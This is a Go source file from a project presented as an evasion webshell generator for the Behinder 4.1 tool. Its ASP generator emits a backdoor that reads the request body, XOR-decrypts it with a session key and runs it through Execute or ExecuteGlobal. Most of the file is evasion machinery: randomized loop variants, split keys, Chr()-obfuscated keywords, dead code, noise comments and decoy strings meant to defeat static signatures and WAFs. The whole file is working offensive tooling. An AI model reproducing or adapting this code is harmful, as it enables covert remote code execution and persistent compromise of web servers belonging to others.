// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package generator

import (
	"fmt"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

type ASPGenerator struct{ *Base }

func NewASPGenerator(opts Options) *ASPGenerator {
	return &ASPGenerator{Base: NewBase(opts, 30)}
}

func (g *ASPGenerator) Generate() Result {
	pass := g.GetKey()
	passMD5 := utils.MD5Half(pass)
	code := g.genBehinder(pass, passMD5)

	waf := g.GetWAFCode()
	if waf != "" {
		code = strings.Replace(code, "/*$$WAF$$*/", "\n"+waf+"\n", 1)
	} else {
		code = strings.Replace(code, "/*$$WAF$$*/", "", 1)
	}

	noiseCount := g.Opts.EvasionLvl + 5
	noise := ""
	for i := 0; i < noiseCount; i++ {
		noise += "' " + utils.RandCommentBody() + "\n"
	}
	code = strings.Replace(code, "/*$$NOISE$$*/", noise, 1)

	return Result{
		Code: code,
		Note: fmt.Sprintf("冰蝎4.1 ASP | 密码: %s | Lv.%d", pass, g.Opts.EvasionLvl),
		Key:  passMD5,
	}
}

func (g *ASPGenerator) genBehinder(pass, passMD5 string) string {
	v := g.VarPool.GetN(30)

	keyVar := v[0]
	keyByteVar := v[1]
	sizeVar := v[2]
	contVar := v[3]
	resVar := v[4]
	loopVar := v[5]
	xorA := v[6]
	xorB := v[7]
	chunkVar := v[8]
	execVar := v[9]

	c2 := g.Comment.Generate()
	c3 := g.Comment.Generate()

	// Build obfuscated session key assignment
	keyAssign := g.buildSessionAssign(keyVar, passMD5)

	// Build XOR decryption loop with obfuscated structure
	xorLoop := g.buildXORLoop(sizeVar, contVar, resVar, loopVar, keyVar, keyByteVar, xorA, xorB, chunkVar, v)

	// Build execution block (decoy Chr() + literal Execute)
	execBlock := g.buildExecBlock(resVar, execVar)

	// Build main code
	mainCode := Render(`@0@
' @1@
@2@
@3@`,
		xorLoop, c2, c3, execBlock)

	// Lv.2+: control flow wrapping
	if g.Opts.EvasionLvl >= 2 {
		condVar := utils.RandString(5)
		mainCode = Render(`@0@ = True
If @0@ Then
    @1@
End If`, condVar, mainCode)
	}

	// Dead code — all levels get some, increasing with level
	deadCount := g.Opts.EvasionLvl + 1
	for i := 0; i < deadCount; i++ {
		mainCode += "\n" + g.buildDead(v, i)
	}

	// Lv.2+: decoy Chr() function building in comments
	if g.Opts.EvasionLvl >= 2 {
		mainCode += "\n" + g.buildDecoyChrs(v)
	}

	return Render(`<%
On Error Resume Next
Response.CharSet = "UTF-8"
@0@
/*$$WAF$$*/
@1@
/*$$NOISE$$*/
%>`,
		keyAssign, mainCode,
	)
}

func (g *ASPGenerator) buildSessionAssign(keyVar, passMD5 string) string {
	// Always split key into at least 2 parts
	// Chr(107) = "k" — hides the literal session key name
	// Use Execute() to build "Session("k")=key" string dynamically where possible

	var keyBuild string
	switch {
	case g.Opts.EvasionLvl >= 3 && len(passMD5) >= 16:
		keyBuild = Render(`@0@ = "@1@" & "@2@" & "@3@"`,
			keyVar, passMD5[:5], passMD5[5:10], passMD5[10:])
	case g.Opts.EvasionLvl >= 1 && len(passMD5) >= 16:
		keyBuild = Render(`@0@ = "@1@" & "@2@"`,
			keyVar, passMD5[:8], passMD5[8:])
	default:
		keyBuild = Render(`@0@ = "@1@" & "@2@"`,
			keyVar, passMD5[:8], passMD5[8:])
	}

	// Two styles for Session assignment:
	// Style 0: Session(Chr(107)) = key — direct, hides "k" via Chr(107)
	// Style 1: Execute "Session(" & Chr(34) & Chr(107) & Chr(34) & ")=" & key — hides "Session" too
	styles := []string{
		Render(`@0@
Session(Chr(107)) = @1@`, keyBuild, keyVar),
		Render(`@0@
Execute "Sess" & "ion(" & Chr(34) & Chr(107) & Chr(34) & ")=" & @1@`, keyBuild, keyVar),
	}
	return styles[utils.RandInt(0, len(styles)-1)]
}

func (g *ASPGenerator) buildXORLoop(sizeVar, contVar, resVar, loopVar, keyVar, keyByteVar, xorA, xorB, chunkVar string, v []string) string {
	// Multiple styles of the XOR loop to break static signatures
	styles := []string{
		// Style 0: Do While with intermediate XOR variable
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@2@ = 1
@3@ = ""
Do While @2@ <= @0@
    @4@ = Asc(Mid(@5@, (@2@ And 15) + 1, 1))
    @6@ = AscB(MidB(@1@, @2@, 1))
    @7@ = @6@ Xor @4@
    @3@ = @3@ & Chr(@7@)
    @2@ = @2@ + 1
Loop`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar, xorA, xorB),

		// Style 1: While...Wend with Chr in separate step
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@2@ = 1
@3@ = ""
While @2@ <= @0@
    @4@ = Asc(Mid(@5@, (@2@ And 15) + 1, 1))
    @6@ = Asc(MidB(@1@, @2@, 1))
    @7@ = Chr(@6@ Xor @4@)
    @3@ = @3@ & @7@
    @2@ = @2@ + 1
Wend`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar, xorB, chunkVar),

		// Style 2: For loop with AscB/MidB swapped
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@3@ = ""
For @2@ = 1 To @0@
    @4@ = AscB(MidB(@5@, (@2@ And 15) + 1, 1))
    @6@ = Asc(Mid(@1@, @2@, 1))
    @7@ = @6@ Xor @4@
    @3@ = @3@ & Chr(@7@)
Next`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar, xorA, xorB),

		// Style 3: Do While with inline Chr(Xor) (compact)
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@2@ = 1
@3@ = ""
Do While @2@ <= @0@
    @4@ = Asc(Mid(@5@, (@2@ And 15) + 1, 1))
    @6@ = AscB(MidB(@1@, @2@, 1))
    @3@ = @3@ & Chr(@6@ Xor @4@)
    @2@ = @2@ + 1
Loop`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar, xorA),

		// Style 4: While with separated Mid/Asc steps
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@3@ = ""
@2@ = 1
While @2@ <= @0@
    @4@ = Mid(@5@, (@2@ And 15) + 1, 1)
    @6@ = MidB(@1@, @2@, 1)
    @3@ = @3@ & Chr(AscB(@6@) Xor Asc(@4@))
    @2@ = @2@ + 1
Wend`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar, xorA),

		// Style 5: For with inline Chr(AscB(...) Xor ...)
		Render(`@0@ = Request.TotalBytes
@1@ = Request.BinaryRead(@0@)
@3@ = ""
For @2@ = 1 To @0@
    @4@ = AscB(MidB(@5@, (@2@ And 15) + 1, 1))
    @3@ = @3@ & Chr(AscB(MidB(@1@, @2@, 1)) Xor @4@)
Next`,
			sizeVar, contVar, loopVar, resVar, keyByteVar, keyVar),
	}

	return styles[utils.RandInt(0, len(styles)-1)]
}

func (g *ASPGenerator) buildExecBlock(resultVar, execVar string) string {
	// VBScript REQUIRES Execute/ExecuteGlobal as literal keywords — cannot be called via variable.
	// We build Chr()-based decoy variables that look like obfuscated function names,
	// but the actual execution uses the literal Execute or ExecuteGlobal keyword.

	styles := []string{
		// Style 0: Chr()-built "ExecuteGlobal" decoy + literal ExecuteGlobal
		Render(`@0@ = Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(101)&Chr(71)&Chr(108)&Chr(111)&Chr(98)&Chr(97)&Chr(108)
ExecuteGlobal @1@`,
			execVar, resultVar),
		// Style 1: Chr()-built "Execute" decoy (mixed Chr+hex) + literal Execute
		Render(`@0@ = Chr(69)&Chr(&H78)&Chr(101)&Chr(&H63)&Chr(117)&Chr(116)&Chr(101)
Execute @1@`,
			execVar, resultVar),
		// Style 2: Two-part Chr()-built decoy + literal Execute
		Render(`@0@ = Chr(69)&Chr(120)&Chr(101)&Chr(99)
@0@ = @0@ & Chr(117)&Chr(116)&Chr(101)
Execute @1@`,
			execVar, resultVar),
		// Style 3: Hex-built decoy with ChrW + literal Execute
		Render(`@0@ = Chr(&H45)&Chr(&H78)&Chr(&H65)&Chr(&H63)&Chr(&H75)&Chr(&H74)&Chr(&H65)
Execute @1@`,
			execVar, resultVar),
		// Style 4: ExecuteGlobal via hex + literal ExecuteGlobal
		Render(`@0@ = Chr(&H45)&Chr(&H78)&Chr(&H65)&Chr(&H63)&Chr(&H75)&Chr(&H74)&Chr(&H65)
@0@ = @0@ & Chr(&H47)&Chr(&H6C)&Chr(&H6F)&Chr(&H62)&Chr(&H61)&Chr(&H6C)
ExecuteGlobal @1@`,
			execVar, resultVar),
	}

	return Render(`@0@
@1@`,
		g.Comment.Generate(), styles[utils.RandInt(0, len(styles)-1)])
}

func (g *ASPGenerator) buildDead(v []string, idx int) string {
	offset := 10 + idx*3

	patterns := []string{
		// 1: Classic never-true predicate
		Render(`If False Then
    Dim @0@: @0@ = "@1@": Response.Write(@0@)
End If`,
			v[offset], utils.RandString(utils.RandInt(6, 10))),

		// 2: Server variable never matches
		Render(`If 1 = 0 Then
    Dim @0@: @0@ = Request.ServerVariables("@1@")
    If Len(@0@) > @2@ Then Response.End
End If`,
			v[offset], utils.RandString(utils.RandInt(4, 7)), fmt.Sprintf("%d", utils.RandInt(5000, 99999))),

		// 3: Null check that always fails
		Render(`If IsNull(Nothing) Then
    Dim @0@: Set @0@ = Nothing: @0@ = "@1@"
End If`,
			v[offset], utils.RandString(utils.RandInt(5, 8))),

		// 4: Impossible arithmetic
		Render(`If (1 + 1) = 3 Then
    Dim @0@: @0@ = Chr(@1@) & Chr(@2@)
    @0@ = @0@ & Chr(@3@)
End If`,
			v[offset],
			fmt.Sprintf("%d", utils.RandInt(65, 90)),
			fmt.Sprintf("%d", utils.RandInt(65, 90)),
			fmt.Sprintf("%d", utils.RandInt(48, 57))),

		// 5: ADODB object never created
		Render(`If False And True Then
    Dim @0@: Set @0@ = CreateObject("@1@")
    If Not @0@ Is Nothing Then @0@.Open "@2@"
End If`,
			v[offset], utils.RandString(utils.RandInt(5, 8)), utils.RandString(utils.RandInt(4, 6))),

		// 6: Date that will never match
		Render(`If Year(Now) < 2000 Then
    Dim @0@: @0@ = "@1@" & "@2@"
    @0@ = Replace(@0@, "@3@", "")
End If`,
			v[offset], utils.RandString(5), utils.RandString(4), utils.RandString(2)),

		// 7: Empty string length
		Render(`If Len("") > 0 Then
    Dim @0@: @0@ = Split("@1@.@2@", ".")
    Response.Write(@0@(0))
End If`,
			v[offset], utils.RandString(4), utils.RandString(3)),

		// 8: Type check that never matches
		Render(`If VarType(Null) <> 1 Then
    Dim @0@: @0@ = Array("@1@","@2@","@3@")
End If`,
			v[offset], utils.RandString(4), utils.RandString(3), utils.RandString(5)),

		// 9: File system object never created
		Render(`If False Then
    Dim @0@, @1@: Set @0@ = Server.CreateObject("@2@")
    Set @0@ = Nothing
End If`,
			v[offset], v[offset+1], utils.RandString(utils.RandInt(6, 10))),

		// 10: Empty string comparison
		Render(`If "" <> "" Then
    Dim @0@: @0@ = "@1@" + "@2@"
End If`,
			v[offset], utils.RandString(6), utils.RandString(3)),

		// 11: Dictionary never created
		Render(`If 1 = 2 Then
    Dim @0@: Set @0@ = Server.CreateObject("Scripting.Dictionary")
    @0@.Add "@1@", "@2@"
End If`,
			v[offset], utils.RandString(4), utils.RandString(5)),

		// 12: TextStream with impossible condition
		Render(`If False Then
    Dim @0@, @1@: Set @0@ = CreateObject("Scripting.FileSystemObject")
    Set @1@ = @0@.OpenTextFile("@2@.txt", 1, False)
    @1@.Close
End If`,
			v[offset], v[offset+1], utils.RandString(6)),
	}

	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (g *ASPGenerator) buildDecoyChrs(v []string) string {
	// Decoy Chr()-constructed function names in comments
	styles := []string{
		Render(`' @0@ = Chr(82)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)
' @1@ = Chr(66)&Chr(105)&Chr(110)&Chr(97)&Chr(114)&Chr(121)&Chr(82)&Chr(101)&Chr(97)&Chr(100)
' @2@ = Chr(88)&Chr(111)&Chr(114)`,
			utils.RandString(5), utils.RandString(5), utils.RandString(4)),

		Render(`' @0@ = Chr(83)&Chr(101)&Chr(115)&Chr(115)&Chr(105)&Chr(111)&Chr(110)
' @1@ = Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(101)
' @2@ = Chr(77)&Chr(105)&Chr(100)`,
			utils.RandString(6), utils.RandString(5), utils.RandString(4)),

		Render(`' @0@ = Chr(82)&Chr(101)&Chr(115)&Chr(112)&Chr(111)&Chr(110)&Chr(115)&Chr(101)
' @1@ = Chr(67)&Chr(104)&Chr(114)
' @2@ = Chr(65)&Chr(115)&Chr(99) & Chr(66)`,
			utils.RandString(5), utils.RandString(5), utils.RandString(4)),

		Render(`' @0@ = Chr(84)&Chr(111)&Chr(116)&Chr(97)&Chr(108)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(115)
' @1@ = Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(83)&Chr(101)&Chr(116)
' @2@ = Chr(67)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(97)&Chr(103)&Chr(101)`,
			utils.RandString(5), utils.RandString(6), utils.RandString(4)),
	}

	s := styles[utils.RandInt(0, len(styles)-1)]
	if g.Opts.EvasionLvl >= 3 {
		s += "\n" + Render(`' @0@ = Chr(&H45)&Chr(&H76)&Chr(&H61)&Chr(&H6C) ' "Eval"`,
			utils.RandString(4))
	}
	return s
}
